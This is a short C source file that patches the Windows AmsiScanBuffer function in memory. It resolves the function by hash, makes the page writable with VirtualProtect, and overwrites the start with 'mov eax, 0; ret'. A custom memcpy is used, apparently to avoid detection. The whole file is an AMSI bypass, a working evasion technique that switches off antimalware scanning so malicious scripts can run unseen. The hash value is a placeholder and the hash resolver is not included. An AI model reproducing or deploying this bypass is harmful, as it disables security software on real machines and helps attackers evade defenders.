#include <windows.h>

// custom mem copy fun to avoid using standard memcpy
void my_memcpy(void *dest, const void *src, size_t n)
{
    char *d = (char *)dest;
    const char *s = (const char *)src;
    for (size_t i = 0; i < n; i++)
    {
        d[i] = s[i];
    }
}

// fun to patch memory
void ApplyProPatch()
{
    //get addr of target fun using hash
    void *pAmsiScanBuffer = GetAddressByHash(0x12345678);

    // 2. change memory protection to write
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

    //prepare patch: mov eax, 0; ret
    unsigned char proPatch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3};

    //Apply patch using custom memory copy
    my_memcpy(pAmsiScanBuffer, proPatch, sizeof(proPatch));

    //Restore original memory protection
    VirtualProtect(pAmsiScanBuffer, 8, oldProtect, &oldProtect);
}
